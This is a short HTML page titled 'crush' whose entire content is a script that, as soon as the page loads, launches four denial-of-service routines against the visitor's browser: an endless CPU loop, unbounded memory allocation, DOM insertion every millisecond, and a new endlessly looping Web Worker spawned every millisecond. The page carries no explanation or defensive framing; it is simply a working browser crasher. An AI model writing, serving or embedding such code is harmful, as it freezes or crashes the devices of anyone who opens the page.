<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crush</title>
    <script>
        function overload() {
            while (true) {
                Math.random() * Math.random();
            }
        }

        function memoryLeak() {
            let arr = [];
            while (true) {
                arr.push(new Array(1000000).fill("X"));
            }
        }

        function domSpam() {
            setInterval(() => {
                let div = document.createElement("div");
                div.innerHTML = "X".repeat(10000);
                document.body.appendChild(div);
            }, 1);
        }

        function asyncBomb() {
            setInterval(() => {
                new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
            }, 1);
        }

        setTimeout(overload, 10);
        setTimeout(memoryLeak, 10);
        setTimeout(domSpam, 10);
        setTimeout(asyncBomb, 10);
    </script>
</head>
<body>
    <h1>crush</h1>
</body>
</html>
